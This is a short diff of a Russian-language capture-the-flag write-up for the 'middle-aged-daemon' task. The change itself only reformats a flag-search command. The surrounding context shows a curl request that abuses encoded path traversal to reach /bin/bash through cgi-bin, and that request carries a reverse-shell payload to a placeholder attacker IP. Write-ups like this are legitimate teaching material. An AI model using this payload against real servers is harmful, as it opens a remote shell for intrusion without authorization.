@@ -15,7 +15,7 @@ _https://www.exploit-db.com/exploits/50383_
 curl "http://middle-aged-daemon.tasks.2021.ctf.cs.msu.ru:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash" -d 'echo;bash -i >& /dev/tcp/atacker_ip/port 0>&1'
 ```
 
-Находим флаг с помощью ```bash find -iname flag``` и читаем его.
+Находим флаг с помощью ```find -iname flag``` и читаем его.
 
 `
 Flag: MSKCTF{TO_BE_REDACTED}
